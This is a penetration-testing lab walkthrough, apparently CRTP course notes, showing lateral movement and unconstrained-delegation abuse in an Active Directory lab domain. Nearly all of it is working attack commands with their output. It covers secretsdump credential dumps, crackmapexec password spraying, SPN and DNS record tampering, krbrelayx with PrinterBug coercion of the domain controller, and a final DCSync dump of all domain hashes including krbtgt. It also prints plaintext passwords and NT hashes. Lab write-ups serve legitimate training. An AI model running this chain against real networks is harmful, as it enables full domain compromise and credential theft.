#### Theory can be found in [[2. Domain Privilege Escalation]] ####

## Lateral Movement to DCORP-ADMINSVC ##
### Credentials Dumping ###
- student303 is a local administrator to DCORP-ADMINSVC
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# impacket-secretsdump dollarcorp.moneycorp.local/student303:a5fdNPDwScrD7T2A@172.16.4.101
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x0aa524e1204e0a68be320cc136ed76b9
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2c0bba089d2d62e4d8911fc2fcc0c2e2:::

<snip>
[*] _SC_SNMPTRAP 
dcorp\websvc:AServicewhichIsNotM3@nttoBe
[*] _SC_wmiApSrv 
dcorp\appadmin:*ActuallyTheWebServer1
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```

### Credentials Spraying ###
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/dollarcorp.moneycorp.local]
└─# crackmapexec smb dollarcorp.moneycorp.local_live_hosts.lst -u websvc -p 'AServicewhichIsNotM3@nttoBe'
SMB         172.16.4.217    445    DCORP-APPSRV     [*] Windows 10.0 Build 20348 x64 (name:DCORP-APPSRV) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.3.21     445    DCORP-MSSQL      [*] Windows 10.0 Build 20348 x64 (name:DCORP-MSSQL) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.3.81     445    DCORP-SQL1       [*] Windows 10.0 Build 20348 x64 (name:DCORP-SQL1) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.4.44     445    DCORP-MGMT       [*] Windows 10.0 Build 20348 x64 (name:DCORP-MGMT) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.2.1      445    DCORP-DC         [*] Windows 10.0 Build 20348 x64 (name:DCORP-DC) (domain:dollarcorp.moneycorp.local) (signing:True) (SMBv1:False)
SMB         172.16.3.11     445    DCORP-CI         [*] Windows 10.0 Build 20348 x64 (name:DCORP-CI) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.4.101    445    DCORP-ADMINSRV   [*] Windows 10.0 Build 20348 x64 (name:DCORP-ADMINSRV) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.4.217    445    DCORP-APPSRV     [+] dollarcorp.moneycorp.local\websvc:AServicewhichIsNotM3@nttoBe 
SMB         172.16.4.217    445    DCORP-APPSRV     Node WEBSVC@DOLLARCORP.MONEYCORP.LOCAL successfully set as owned in BloodHound
SMB         172.16.3.21     445    DCORP-MSSQL      [+] dollarcorp.moneycorp.local\websvc:AServicewhichIsNotM3@nttoBe 
SMB         172.16.3.81     445    DCORP-SQL1       [+] dollarcorp.moneycorp.local\websvc:AServicewhichIsNotM3@nttoBe 
SMB         172.16.4.44     445    DCORP-MGMT       [+] dollarcorp.moneycorp.local\websvc:AServicewhichIsNotM3@nttoBe 
SMB         172.16.2.1      445    DCORP-DC         [+] dollarcorp.moneycorp.local\websvc:AServicewhichIsNotM3@nttoBe 
SMB         172.16.3.11     445    DCORP-CI         [+] dollarcorp.moneycorp.local\websvc:AServicewhichIsNotM3@nttoBe 
SMB         172.16.4.101    445    DCORP-ADMINSRV   [+] dollarcorp.moneycorp.local\websvc:AServicewhichIsNotM3@nttoBe
```

```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/dollarcorp.moneycorp.local]
└─# crackmapexec smb dollarcorp.moneycorp.local_live_hosts.lst -u appadmin -p '*ActuallyTheWebServer1'
SMB         172.16.4.44     445    DCORP-MGMT       [*] Windows 10.0 Build 20348 x64 (name:DCORP-MGMT) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.3.21     445    DCORP-MSSQL      [*] Windows 10.0 Build 20348 x64 (name:DCORP-MSSQL) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.3.81     445    DCORP-SQL1       [*] Windows 10.0 Build 20348 x64 (name:DCORP-SQL1) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.2.1      445    DCORP-DC         [*] Windows 10.0 Build 20348 x64 (name:DCORP-DC) (domain:dollarcorp.moneycorp.local) (signing:True) (SMBv1:False)
SMB         172.16.4.217    445    DCORP-APPSRV     [*] Windows 10.0 Build 20348 x64 (name:DCORP-APPSRV) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.3.11     445    DCORP-CI         [*] Windows 10.0 Build 20348 x64 (name:DCORP-CI) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.4.101    445    DCORP-ADMINSRV   [*] Windows 10.0 Build 20348 x64 (name:DCORP-ADMINSRV) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.4.44     445    DCORP-MGMT       [+] dollarcorp.moneycorp.local\appadmin:*ActuallyTheWebServer1 
SMB         172.16.4.44     445    DCORP-MGMT       Node APPADMIN@DOLLARCORP.MONEYCORP.LOCAL successfully set as owned in BloodHound
SMB         172.16.3.21     445    DCORP-MSSQL      [+] dollarcorp.moneycorp.local\appadmin:*ActuallyTheWebServer1 
SMB         172.16.3.81     445    DCORP-SQL1       [+] dollarcorp.moneycorp.local\appadmin:*ActuallyTheWebServer1 
SMB         172.16.2.1      445    DCORP-DC         [+] dollarcorp.moneycorp.local\appadmin:*ActuallyTheWebServer1 
SMB         172.16.4.217    445    DCORP-APPSRV     [+] dollarcorp.moneycorp.local\appadmin:*ActuallyTheWebServer1 (🩸Blooded!🩸)
SMB         172.16.3.11     445    DCORP-CI         [+] dollarcorp.moneycorp.local\appadmin:*ActuallyTheWebServer1 
SMB         172.16.4.101    445    DCORP-ADMINSRV   [+] dollarcorp.moneycorp.local\appadmin:*ActuallyTheWebServer1 (🩸Blooded!🩸)
```

## Lateral Movement to DCORP-APPSRV ##
### Credentials Dumping ###
- appadmin is a local administrator to DCORP-APPSRV
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# impacket-secretsdump dollarcorp.moneycorp.local/appadmin:'*ActuallyTheWebServer1'@172.16.4.217
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe5c3669effe24c2fadc075d8b8c43e6c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4fabdaa30a85df4b02e388b4fa8cdf25:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
DOLLARCORP.MONEYCORP.LOCAL/appadmin:$DCC2$10240#appadmin#8bb559da7ec65410afbd8c561b37f5b5

<snip>

dcorp\DCORP-APPSRV$:aad3b435b51404eeaad3b435b51404ee:b4cb7bf8b93c78b8051c7906bb054dc5:::

<snip>
```

## DCORP-APPSRV Unconstrained Delegation Abuse ##

- Query the DC for Delegation
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# impacket-findDelegation dollarcorp.moneycorp.local/student303:a5fdNPDwScrD7T2A -dc-ip 172.16.2.1
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

AccountName      AccountType  DelegationType                      DelegationRightsTo                          
---------------  -----------  ----------------------------------  -------------------------------------------
DCORP-ADMINSRV$  Computer     Constrained w/ Protocol Transition  TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL    
DCORP-ADMINSRV$  Computer     Constrained w/ Protocol Transition  TIME/dcorp-DC                               
DCORP-APPSRV$    Computer     Unconstrained                       N/A                                         
websvc           Person       Constrained w/ Protocol Transition  CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL 
websvc           Person       Constrained w/ Protocol Transition  CIFS/dcorp-mssql
```

- Query the DC for SPN modification capabilities.
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# python3 addspn.py -u 'dollarcorp.moneycorp.local\DCORP-APPSRV$' -p aad3b435b51404eeaad3b435b51404ee:b4cb7bf8b93c78b8051c7906bb054dc5 -q DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
DN: CN=DCORP-APPSRV,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local - STATUS: Read - READ TIME: 2023-08-06T20:19:08.683756
    dNSHostName: dcorp-appsrv.dollarcorp.moneycorp.local
    sAMAccountName: DCORP-APPSRV$
    servicePrincipalName: TERMSRV/DCORP-APPSRV
                          TERMSRV/dcorp-appsrv.dollarcorp.moneycorp.local
                          RestrictedKrbHost/DCORP-APPSRV
                          HOST/DCORP-APPSRV
                          RestrictedKrbHost/dcorp-appsrv.dollarcorp.moneycorp.local
                          HOST/dcorp-appsrv.dollarcorp.moneycorp.local
```

- Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property.
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# python3 addspn.py -u 'dollarcorp.moneycorp.local\DCORP-APPSRV$' -p aad3b435b51404eeaad3b435b51404ee:b4cb7bf8b93c78b8051c7906bb054dc5 -s HOST/WS01.DOLLARCORP.MONEYCORP.LOCAL DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL --additional
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

- Query the DC to verify that the SPN has been modified.
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# python3 addspn.py -u 'dollarcorp.moneycorp.local\DCORP-APPSRV$' -p aad3b435b51404eeaad3b435b51404ee:b4cb7bf8b93c78b8051c7906bb054dc5 -q DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
DN: CN=DCORP-APPSRV,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local - STATUS: Read - READ TIME: 2023-08-06T20:24:38.930703
    dNSHostName: dcorp-appsrv.dollarcorp.moneycorp.local
    msDS-AdditionalDnsHostName: WS01.DOLLARCORP.MONEYCORP.LOCAL
    sAMAccountName: DCORP-APPSRV$
    servicePrincipalName: TERMSRV/WS01
                          TERMSRV/WS01.DOLLARCORP.MONEYCORP.LOCAL
                          RestrictedKrbHost/WS01
                          HOST/WS01
                          RestrictedKrbHost/WS01.DOLLARCORP.MONEYCORP.LOCAL
                          HOST/WS01.DOLLARCORP.MONEYCORP.LOCAL
                          TERMSRV/DCORP-APPSRV
                          TERMSRV/dcorp-appsrv.dollarcorp.moneycorp.local
                          RestrictedKrbHost/DCORP-APPSRV
                          HOST/DCORP-APPSRV
                          RestrictedKrbHost/dcorp-appsrv.dollarcorp.moneycorp.local
                          HOST/dcorp-appsrv.dollarcorp.moneycorp.local
```

- Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs.
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# python3 dnstool.py -u 'dollarcorp.moneycorp.local\DCORP-APPSRV$' -p aad3b435b51404eeaad3b435b51404ee:b4cb7bf8b93c78b8051c7906bb054dc5 -r 'WS01.DOLLARCORP.MONEYCORP.LOCAL' -d 172.16.99.3 172.16.2.1 --action add -t A          
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

- Verify that the DNS entry has been correctly set.
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# python3 dnstool.py -u 'dollarcorp.moneycorp.local\DCORP-APPSRV$' -p aad3b435b51404eeaad3b435b51404ee:b4cb7bf8b93c78b8051c7906bb054dc5 -r 'WS01.DOLLARCORP.MONEYCORP.LOCAL' -d 172.16.99.3 --action query 'DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL' 
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record WS01
DC=WS01,DC=dollarcorp.moneycorp.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=dollarcorp,DC=moneycorp,DC=local
[+] Record entry:
 - Type: 1 (A) (Serial: 132)
 - Address: 172.16.99.3
```

- Start the krbrelayx listener (the AES key is used by default by computer accounts to decrypt tickets)
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# python3 krbrelayx.py -aesKey f5ae52b9f36f1e41b2f0c59a3c18aa4367c27c3e1a450ef4d4df010210d054cd
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```

- Authentication coercion via PrinterBug.
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# python3 printerbug.py 'dollarcorp.moneycorp.local/DCORP-APPSRV$@DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL' -hashes aad3b435b51404eeaad3b435b51404ee:b4cb7bf8b93c78b8051c7906bb054dc5 WS01.DOLLARCORP.MONEYCORP.LOCAL
[*] Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Attempting to trigger authentication via rprn RPC at DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked
```

```
<snip>

[*] SMBD: Received connection from 172.16.2.1
[*] Got ticket for DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL [krbtgt@DOLLARCORP.MONEYCORP.LOCAL]
[*] Saving ticket in DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt@DOLLARCORP.MONEYCORP.LOCAL.ccache
[*] SMBD: Received connection from 172.16.2.1
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 172.16.2.1
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
```

- Rename the ST
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# mv DCORP-DC\$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt@DOLLARCORP.MONEYCORP.LOCAL.ccache dcorp.ccache
```

- Loot the DC
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# export KRB5CCNAME=dcorp.ccache
```

```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# impacket-secretsdump 'dollarcorp.moneycorp.local/dcorp-dc$'@DCORP-DC -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:af0686cc0ca8f04df42210c9ac980760:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e9815869d2090ccfca61c1fe0d23986:::
sqladmin\sqladmin:1113:aad3b435b51404eeaad3b435b51404ee:07e8be316e3da9a042a9cb681df19bf5:::
websvc\websvc:1114:aad3b435b51404eeaad3b435b51404ee:cc098f204c5887eaa8253e7c2749156f:::
srvadmin\srvadmin:1115:aad3b435b51404eeaad3b435b51404ee:a98e18228819e8eec3dfa33cb68b0728:::
appadmin\appadmin:1117:aad3b435b51404eeaad3b435b51404ee:d549831a955fee51a43c83efb3928fa7:::
svcadmin\svcadmin:1118:aad3b435b51404eeaad3b435b51404ee:b38ff50264b74508085d82c69794a4d8:::
testda\testda:1119:aad3b435b51404eeaad3b435b51404ee:a16452f790729fa34e8f3a08f234a82c:::
mgmtadmin\mgmtadmin:1120:aad3b435b51404eeaad3b435b51404ee:95e2cd7ff77379e34c6e46265e75d754:::
ciadmin\ciadmin:1121:aad3b435b51404eeaad3b435b51404ee:e08253add90dccf1a208523d02998c3d:::
sql1admin\sql1admin:1122:aad3b435b51404eeaad3b435b51404ee:e999ae4bd06932620a1e78d2112138c6:::

<snip>
```